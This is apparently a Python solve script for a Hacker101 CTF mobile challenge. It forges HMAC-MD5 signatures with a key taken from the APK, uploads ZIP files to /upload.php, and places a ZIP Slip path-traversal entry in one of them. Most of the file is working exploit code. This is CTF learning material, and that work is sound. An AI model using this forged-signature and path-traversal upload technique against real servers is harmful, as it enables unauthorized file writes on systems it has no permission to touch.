#!/usr/bin/env python3
"""
PoC: Mobile Webdev (HackerOne CTF)
Flags: 2

Description:
  The challenge provides an Android APK that embeds an HMAC key in its source code.
  The app is a WebView-based content editor that loads /content/ from a remote server.
  The server exposes /upload.php which accepts ZIP archives, but requires an HMAC
  signature computed with the embedded key (HMAC-MD5).
  
  Flag 0: Upload any valid HMAC-signed ZIP to get the flag.
  Flag 1: Upload a ZIP with path traversal (ZIP Slip) filenames to get the second flag.
          Both flags are returned when a path-traversal ZIP with valid HMAC is uploaded.

Usage: python3 solve.py <ctf_base_url>
"""

import sys, hmac, hashlib, io, zipfile, re, urllib3
import requests
urllib3.disable_warnings()

# HMAC key extracted from the APK's MainActivity.java
HMAC_KEY_HEX = "8c34bac50d9b096d41cafb53683b315690acf65a11b5f63250c61f7718fa1d1d"
HMAC_KEY_RAW = bytes.fromhex(HMAC_KEY_HEX)

FLAG_RE = re.compile(r'\^FLAG\^([a-f0-9]{64})\$FLAG\$')


def create_zip(files: dict) -> bytes:
    """Create a ZIP archive from a dict of {filename: content}."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as zf:
        for name, content in files.items():
            zf.writestr(name, content)
    return buf.getvalue()


def hmac_sign(data: bytes) -> str:
    """Compute HMAC-MD5 signature of data using the embedded key."""
    return hmac.new(HMAC_KEY_RAW, data, hashlib.md5).hexdigest()


def upload_zip(base_url: str, zip_data: bytes) -> str:
    """Upload a signed ZIP and return the server response."""
    sig = hmac_sign(zip_data)
    r = requests.post(
        f"{base_url}/upload.php",
        files={"file": ("payload.zip", zip_data, "application/zip")},
        data={"hmac": sig},
        verify=False,
        allow_redirects=True
    )
    return r.text


def extract_flags(text: str) -> list:
    """Extract flag hex values from response text."""
    return [m.group(1) for m in FLAG_RE.finditer(text)]


def solve(base_url: str):
    """Capture both flags."""
    base_url = base_url.rstrip("/")

    # ---- Flag 0: Valid HMAC upload (no traversal needed) ----
    print("[*] Uploading benign ZIP for Flag 0...")
    zip_data = create_zip({"test.txt": "hello"})
    resp = upload_zip(base_url, zip_data)
    flags = extract_flags(resp)
    
    if flags:
        print(f"[+] Flag 0: {flags[0]}")
    else:
        print("[-] Flag 0 not found in response")

    # ---- Flag 1: ZIP with path traversal (ZIP Slip) ----
    print("[*] Uploading path-traversal ZIP for Flag 1...")
    zip_data = create_zip({
        "../../../tmp/evil.txt": "zip slip payload"
    })
    resp = upload_zip(base_url, zip_data)
    flags = extract_flags(resp)
    
    # Flag 1 is the second flag in the response
    if len(flags) >= 2:
        print(f"[+] Flag 1: {flags[1]}")
    elif len(flags) == 1:
        print(f"[*] Only found 1 flag (expected 2). Flag: {flags[0]}")
    else:
        print("[-] No flags found in traversal response")

    # Summary
    all_flags = extract_flags(resp)
    unique = list(dict.fromkeys(all_flags))  # deduplicate preserving order
    print(f"\n[+] Captured {len(unique)} flag(s):")
    for i, f in enumerate(unique):
        print(f"    Flag {i}: {f}")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <ctf_base_url>")
        print(f"Example: {sys.argv[0]} https://xxx.ctf.hacker101.com/")
        sys.exit(1)
    solve(sys.argv[1])
